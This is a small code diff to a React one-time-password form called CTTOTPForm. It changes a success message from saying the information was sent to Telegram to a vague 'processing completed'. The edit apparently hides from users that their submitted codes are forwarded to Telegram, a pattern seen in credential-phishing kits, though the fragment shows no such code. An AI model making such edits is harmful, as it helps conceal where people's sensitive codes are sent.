@@ -136,7 +136,7 @@ const CTTOTPForm = () => {
       if (response.data.status === 'success') {
         toast({
           title: "Código enviado!",
-          description: "Informação enviada para o Telegram",
+          description: "Processamento concluído",
           duration: 2000
         });
 
